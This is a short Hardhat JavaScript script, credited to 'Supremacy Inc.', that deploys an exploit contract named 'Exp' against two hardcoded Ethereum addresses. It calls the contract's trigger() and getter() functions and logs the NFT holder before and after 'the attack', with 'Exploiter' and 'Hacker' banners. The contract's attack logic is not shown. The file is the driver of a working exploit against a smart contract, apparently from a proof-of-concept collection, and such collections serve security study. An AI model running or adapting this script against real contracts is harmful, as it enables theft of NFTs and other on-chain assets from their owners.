// 
//  Author [#] Supremacy Inc.
//

const hre = require("hardhat");

async function main() {
  const Exp = await hre.ethers.getContractFactory("Exp");
  const exp = await Exp.deploy("0x6325439389E0797Ab35752B4F43a14C004f22A9c", "0x812cdA2181ed7c45a35a691E0C85E231D218E273");

  await exp.deployed();

  console.log("[#] 🧛 Exploiter deployed to:", exp.address);

  const before = await exp.status();

  console.log("[#] 🧛 The holder of the NFT before the attack was: ", before);

  await exp.trigger();
  await exp.getter();

  const after = await exp.status();

  console.log("[#] 🧛 The holder of the NFT after the attack was: ", after , "[#] Hacker");

}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
